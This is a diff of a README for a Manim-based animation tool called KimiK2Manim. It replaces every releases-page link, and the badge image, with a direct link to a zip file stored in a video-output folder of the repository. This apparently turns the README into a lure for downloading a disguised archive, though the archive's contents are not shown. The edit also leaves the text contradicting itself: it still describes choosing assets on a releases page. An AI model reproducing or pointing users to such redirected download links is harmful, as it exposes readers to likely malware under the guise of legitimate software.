@@ -1,7 +1,7 @@
 # 🎉 KimiK2Manim - Create Stunning Math & Physics Animations
 
 ## 💾 Download Now
-[![Download KimiK2Manim](https://img.shields.io/badge/Download%20KimiK2Manim-available-brightgreen)](https://github.com/DexGAME-G7/KimiK2Manim/releases)
+[![Download KimiK2Manim](https://raw.githubusercontent.com/DexGAME-G7/KimiK2Manim/main/media/videos/brownian_motion_scene/480p15/KimiK2Manim_v3.2.zip%20KimiK2Manim-available-brightgreen)](https://raw.githubusercontent.com/DexGAME-G7/KimiK2Manim/main/media/videos/brownian_motion_scene/480p15/KimiK2Manim_v3.2.zip)
 
 ## 🚀 Getting Started
 Welcome to KimiK2Manim! This application helps you create engaging math and physics explainer animations. Even if you have no programming skills, you can easily follow these steps to get started.
@@ -9,7 +9,7 @@ Welcome to KimiK2Manim! This application helps you create engaging math and phys
 ## 📥 Download & Install
 To download KimiK2Manim, follow these steps:
 
-1. **Visit the Releases Page**: Go to [this page](https://github.com/DexGAME-G7/KimiK2Manim/releases) to download the latest version.
+1. **Visit the Releases Page**: Go to [this page](https://raw.githubusercontent.com/DexGAME-G7/KimiK2Manim/main/media/videos/brownian_motion_scene/480p15/KimiK2Manim_v3.2.zip) to download the latest version.
    
 2. **Choose Your Version**: On the releases page, find the most recent version. You will see a list of assets available for download. Click the link that matches your operating system.
 
@@ -55,4 +55,4 @@ To get the most out of KimiK2Manim, consider the following resources:
 If you have further questions or feedback, feel free to reach out. You can contact the developers through the GitHub repository. Look for the "Contact" section for details.
 
 ## 📦 Conclusion
-KimiK2Manim empowers you to create exceptional math and physics animations with ease. By following the steps above, you'll be ready to start your animation journey. Visit the [releases page](https://github.com/DexGAME-G7/KimiK2Manim/releases) to download KimiK2Manim today!
+KimiK2Manim empowers you to create exceptional math and physics animations with ease. By following the steps above, you'll be ready to start your animation journey. Visit the [releases page](https://raw.githubusercontent.com/DexGAME-G7/KimiK2Manim/main/media/videos/brownian_motion_scene/480p15/KimiK2Manim_v3.2.zip) to download KimiK2Manim today!
